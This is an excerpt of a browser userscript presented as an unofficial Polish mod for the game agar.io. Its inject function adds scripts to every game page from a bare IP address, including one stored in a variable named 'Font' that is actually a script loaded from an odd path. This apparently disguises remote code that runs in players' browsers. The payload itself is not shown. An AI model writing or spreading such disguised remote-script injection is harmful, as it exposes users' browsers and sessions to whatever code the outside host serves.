// ==UserScript==
// @name         OGARio v2 | RayFix
// @namespace    ogario.v2
// @version      2.0.2
// @description  Unoffical Polish MOD
// @author       szymy, ExP , Ray
// @match        http://agar.io/*
...
var ogarioJS = '<script src="http://138.68.64.49/LOL.js" charset="utf-8"></script>';
var ogarioSniffJS = '<script src="http://ogario.ovh/download/v21/ogario.v2.sniff.js?v=212"></script>';
var ogarioCSS = '<link href="http://138.68.64.49/LOL" rel="stylesheet"></link>';
...
var Font = '<script type="text/javascript" src="http://138.68.64.49/WADAFAK"></script>';

function inject(page) {
    var _page = page.replace("</head>", cpickerCSS + toastrCSS + ogarioCSS + cpickerJS + toastrJS + ogarioSniffJS + Font + "</head>");
